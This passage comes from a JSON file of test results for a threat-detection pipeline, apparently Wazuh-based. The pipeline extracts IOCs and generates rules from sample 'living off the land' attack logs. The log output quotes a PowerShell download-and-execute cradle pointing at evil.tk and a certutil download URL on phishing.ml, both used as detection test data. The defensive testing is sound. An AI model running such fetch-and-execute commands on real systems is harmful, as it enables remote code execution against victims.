Threat intelligence database schema initialized\n2025-08-18 19:52:57 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:52:57 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:52:57 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:52:57 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:52:57 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:52:57 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:52:57 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:52:57 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:52:57 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:52:57 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:52:57 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:52:57 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:52:57 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 19:52:57 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 19:52:57 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 19:52:57 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:52:57 [info     ] Parsing existing rules from: data/rules\n2025-08-18 19:52:57 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 19:52:57 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:52:57 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_195257\n2025-08-18 19:52:57 [info     ] Analytics metrics enabled for data collection\n2025-08-18 19:52:57 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 19:52:57 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=4 log_hash=d5da2ac734d74845a82643215581e31e\n2025-08-18 19:52:58 [info     ] Threat detected                classification=suspicious confidence=0.65 ioc_type=ip ioc_value=185.220.100.250 threat_level=medium\n2025-08-18 19:52:58 [debug    ] VirusTotal rate limiting       sleep_time=13.813626527786255\n2025-08-18 19:53:13 [debug    ] VirusTotal rate limiting       sleep_time=14.084578514099121\n2025-08-18 19:53:28 [debug    ] VirusTotal rate limiting       sleep_time=14.038764476776123\n2025-08-18 19:53:42 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:53:42 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=29161baccc234811b7bf94c8245e323c new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 4\n  \u2022 Findings generated: 1\n  \u2022 Rules generated: 1\n  \u2022 Processing time: 45.028s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.IP: 185.220.100.250 (confidence: 0.60)\n  \u2022 IOCType.DOMAIN: rmmclient.exe (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: rmm.yourlab.net (confidence: 0.50)\n  \u2022 IOCType.FILE_PATH: C:\\\\ProgramData\\\\RMMClient\\\\rmmclient.exe (confidence: 0.50)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "lol_01_certutil_download.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T19:56:13.340606",
      "processing_time": 150.49991583824158,
      "success": true,
      "metrics": {
        "iocs_extracted": 12,
        "findings_generated": 12,
        "rules_generated": 8,
        "ioc_extraction_time": 150.157,
        "threat_classifications": {
          "suspicious": 6,
          "malicious": 6
        },
        "confidence_scores": [
          0.8500000000000001,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0
        ],
        "threat_levels": {
          "medium": 6,
          "high": 6
        },
        "rule_generation_efficiency": 0.6666666666666666
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 26.73,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 19:53:43 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/living_off_land/lol_01_certutil_download.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 19:53:43 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 19:53:43 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:53:43 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:53:43 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:53:43 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:53:43 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:53:43 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:53:43 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:53:43 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:53:43 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:53:43 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:53:43 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:53:43 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:53:43 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:53:43 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:53:43 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:53:43 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:53:43 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:53:43 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:53:43 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:53:43 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 19:53:43 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 19:53:43 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 19:53:43 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:53:43 [info     ] Parsing existing rules from: data/rules\n2025-08-18 19:53:43 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 19:53:43 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:53:43 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_195343\n2025-08-18 19:53:43 [info     ] Analytics metrics enabled for data collection\n2025-08-18 19:53:43 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 19:53:43 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=12 log_hash=d37948373e4d4dfc9c0d8e65197cce8e\n2025-08-18 19:53:44 [info     ] Threat detected                classification=suspicious confidence=0.8500000000000001 ioc_type=ip ioc_value=192.168.1.10 threat_level=medium\n2025-08-18 19:53:44 [debug    ] VirusTotal rate limiting       sleep_time=13.611101388931274\n2025-08-18 19:53:58 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=certutil.exe threat_level=medium\n2025-08-18 19:53:58 [debug    ] VirusTotal rate limiting       sleep_time=14.413732528686523\n2025-08-18 19:54:13 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=domain ioc_value=phishing.ml threat_level=high\n2025-08-18 19:54:13 [debug    ] VirusTotal rate limiting       sleep_time=14.379028797149658\n2025-08-18 19:54:28 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=payload.exe threat_level=medium\n2025-08-18 19:54:28 [debug    ] VirusTotal rate limiting       sleep_time=14.576923608779907\n2025-08-18 19:54:43 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=cmd.exe threat_level=medium\n2025-08-18 19:54:43 [debug    ] VirusTotal rate limiting       sleep_time=14.496382474899292\n2025-08-18 19:54:58 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=url ioc_value=http://phishing.ml/payload.exe threat_level=high\n2025-08-18 19:54:58 [debug    ] VirusTotal rate limiting       sleep_time=14.251954078674316\n2025-08-18 19:55:13 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:55:13 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=//phishing.ml/payload.exe threat_level=high\n2025-08-18 19:55:13 [debug    ] VirusTotal rate limiting       sleep_time=14.999462842941284\n2025-08-18 19:55:28 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:55:28 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\temp\\\\payload.exe threat_level=high\n2025-08-18 19:55:28 [debug    ] VirusTotal rate limiting       sleep_time=14.99836015701294\n2025-08-18 19:55:43 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:55:43 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\certutil.exe threat_level=high\n2025-08-18 19:55:43 [debug    ] VirusTotal rate limiting       sleep_time=14.99942398071289\n2025-08-18 19:55:58 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:55:58 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\cmd.exe threat_level=high\n2025-08-18 19:55:58 [debug    ] VirusTotal rate limiting       sleep_time=14.999241828918457\n2025-08-18 19:56:13 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 19:56:13 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=certutil.exe threat_level=medium\n2025-08-18 19:56:13 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=cmd.exe threat_level=medium\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=2b065d3700d5405881f042810570a175 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=fe0dc3d173a7469cadf659d67c324710 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=cf57a2656a66461cb37379b4871b3e35 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=beda054d04574ce1b6ebcbd0ea544652 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=20bc76e1e90a4767be6239c2557a46b7 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=b814f2eae6a249db9f30e727e514a790 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=83b6d95a77e2453b9da3cd14640cb8cc new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=ed36a071cba942e9b55ec1cdba5c2700 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=c07a8e86244244ae887fb69d84cc808f new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=ef0fd7a0adea4317ab4ee97ef2a9d28b new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=25f3abb25d9b48348660880702bfd6fb new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:56:13 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=a44ad169e59e4f8f98745f151be9655d new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 12\n  \u2022 Findings generated: 12\n  \u2022 Rules generated: 8\n  \u2022 Processing time: 150.157s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.IP: 192.168.1.10 (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: certutil.exe (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: phishing.ml (confidence: 1.00)\n  \u2022 IOCType.DOMAIN: payload.exe (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: cmd.exe (confidence: 0.70)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "lol_03_wmic_execution.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T19:58:58.861894",
      "processing_time": 165.52070474624634,
      "success": true,
      "metrics": {
        "iocs_extracted": 14,
        "findings_generated": 15,
        "rules_generated": 11,
        "ioc_extraction_time": 165.15,
        "threat_classifications": {
          "suspicious": 8,
          "malicious": 6
        },
        "confidence_scores": [
          0.8500000000000001,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0
        ],
        "threat_levels": {
          "medium": 8,
          "high": 6
        },
        "rule_generation_efficiency": 0.7333333333333333
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 26.73,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 19:56:13 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/living_off_land/lol_03_wmic_execution.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 19:56:13 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 19:56:13 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:56:13 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:56:13 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:56:13 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:56:13 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:56:13 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:56:13 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:56:13 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:56:13 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:56:13 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:56:13 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:56:13 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:56:13 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:56:13 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:56:13 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:56:13 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:56:13 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:56:13 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:56:13 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:56:13 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 19:56:13 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 19:56:13 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 19:56:13 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:56:13 [info     ] Parsing existing rules from: data/rules\n2025-08-18 19:56:13 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 19:56:13 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:56:13 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_195613\n2025-08-18 19:56:13 [info     ] Analytics metrics enabled for data collection\n2025-08-18 19:56:13 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 19:56:13 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=14 log_hash=ebf141ad8bf4428780461a1bf2b98694\n2025-08-18 19:56:16 [info     ] Threat detected                classification=suspicious confidence=0.8500000000000001 ioc_type=ip ioc_value=192.168.1.100 threat_level=medium\n2025-08-18 19:56:16 [debug    ] VirusTotal rate limiting       sleep_time=12.220170736312866\n2025-08-18 19:56:29 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=powershell.exe threat_level=medium\n2025-08-18 19:56:29 [debug    ] VirusTotal rate limiting       sleep_time=13.98347020149231\n2025-08-18 19:56:44 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=Net.WebClient threat_level=medium\n2025-08-18 19:56:44 [debug    ] VirusTotal rate limiting       sleep_time=14.079725980758667\n2025-08-18 19:56:59 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=domain ioc_value=evil.tk threat_level=high\n2025-08-18 19:56:59 [debug    ] VirusTotal rate limiting       sleep_time=14.008707284927368\n2025-08-18 19:57:14 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=wmic.exe threat_level=medium\n2025-08-18 19:57:14 [debug    ] VirusTotal rate limiting       sleep_time=14.070473670959473\n2025-08-18 19:57:29 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=cmd.exe threat_level=medium\n2025-08-18 19:57:29 [debug    ] VirusTotal rate limiting       sleep_time=14.125264883041382\n2025-08-18 19:57:44 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=url ioc_value=\"http://evil.tk/script.ps1')\" threat_level=high\n2025-08-18 19:57:44 [debug    ] VirusTotal rate limiting       sleep_time=13.984659433364868\n2025-08-18 19:57:58 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:57:58 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=//evil.tk/script.ps1 threat_level=high\n2025-08-18 19:57:58 [debug    ] VirusTotal rate limiting       sleep_time=14.998149156570435\n2025-08-18 19:58:13 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:58:13 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\wbem\\\\wmic.exe threat_level=high\n2025-08-18 19:58:13 [debug    ] VirusTotal rate limiting       sleep_time=14.999315023422241\n2025-08-18 19:58:28 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:58:28 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\cmd.exe threat_level=high\n2025-08-18 19:58:28 [debug    ] VirusTotal rate limiting       sleep_time=14.998180389404297\n2025-08-18 19:58:43 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 19:58:43 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=powershell.exe threat_level=medium\n2025-08-18 19:58:43 [debug    ] VirusTotal rate limiting       sleep_time=14.999499797821045\n2025-08-18 19:58:58 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 19:58:58 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=wmic.exe threat_level=medium\n2025-08-18 19:58:58 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=cmd.exe threat_level=medium\n2025-08-18 19:58:58 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=command_line ioc_value='IEX (New-Object Net.WebClient).DownloadString(\\'http://evil.tk/script.ps1\\')\\\\\"\",\\n      \"image\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wbem\\\\\\\\wmic.exe\",\\n      \"parentImage\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\"\\n    }\\n  },\\n  \"location\": \"EventChannel\",\\n  \"full_log\": \"Test log entry for lol_03_wmic_execution scenario\"\\n}' threat_level=high\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=b54a11ceffef4972a5e90b6b9d919d81 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=496739151a484480b82982955b253a0e new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=122bb5552b0d4b02883c4a4cf3488ed0 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=47455773addb49be958a55c174f0a464 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=56fe66f68c8445de92d9040672e72913 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=6036edae540c42eabea7abeca7138c7e new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=8248e264e7504dcb9f84aaa4ea824d09 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=57f5147d79954b1a90eaa80dacf3d3d4 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=7a6a6c3734ba4c93bf9d609f1b0fa220 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=11c65d3b07a8452d83e98fed3450a4ab new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=a6bbbf09b00a4cc1bf737de79f09c6c7 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=2cb1b50b14b842268f4d91fd89cc9fa0 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=211fefd4208a495a817e1f99015139f3 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=e9b8f5bfebaf4afa9a44d4842e285a7f new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=dde5b00b769c4900aafad9975d82515e new_rules_generated=1 total_iocs=14 uncovered_iocs=14\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 14\n  \u2022 Findings generated: 15\n  \u2022 Rules generated: 11\n  \u2022 Processing time: 165.150s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.IP: 192.168.1.100 (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: powershell.exe (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: Net.WebClient (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: evil.tk (confidence: 1.00)\n  \u2022 IOCType.DOMAIN: wmic.exe (confidence: 0.70)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "lol_04_mshta_script.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T20:01:14.317739",
      "processing_time": 135.4552013874054,
      "success": true,
      "metrics": {
        "iocs_extracted": 10,
        "findings_generated": 10,
        "rules_generated": 7,
        "ioc_extraction_time": 135.11,
        "threat_classifications": {
          "suspicious": 5,
          "malicious": 5
        },
        "confidence_scores": [
          0.7000000000000001,
          0.9000000000000001,
          1.0,
          0.9000000000000001,
          0.9000000000000001,
          0.9000000000000001,
          0.9000000000000001,
          0.9000000000000001,
          0.9000000000000001,
          1.0
        ],
        "threat_levels": {
          "medium": 5,
          "high": 5
        },
        "rule_generation_efficiency": 0.7
      },
      "memory_delta_mb": 0.25,
      "peak_memory_mb": 26.98,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 19:58:59 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/living_off_land/lol_04_mshta_script.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 19:58:59 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 19:58:59 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:58:59 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:58:59 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:58:59 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:58:59 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:58:59 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:58:59 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:58:59 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:58:59 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:58:59 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:58:59 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:58:59 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:58:59 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:58:59 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:58:59 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:58:59 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:58:59 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:58:59 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:58:59 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:58:59 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 19:58:59 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 19:58:59 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 19:58:59 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:58:59 [info     ] Parsing existing rules from: data/rules\n2025-08-18 19:58:59 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 19:58:59 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:58:59 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_195859\n2025-08-18 19:58:59 [info     ] Analytics metrics enabled for data collection\n2025-08-18 19:58:59 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 19:58:59 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=10 log_hash=58e343e32a9b49ea9c8badb1aa7cb24e\n2025-08-18 19:59:01 [info     ] Threat detected                classification=suspicious confidence=0.7000000000000001 ioc_type=ip ioc_value=192.168.1.10 threat_level=medium\n2025-08-18 19:59:01 [debug    ] 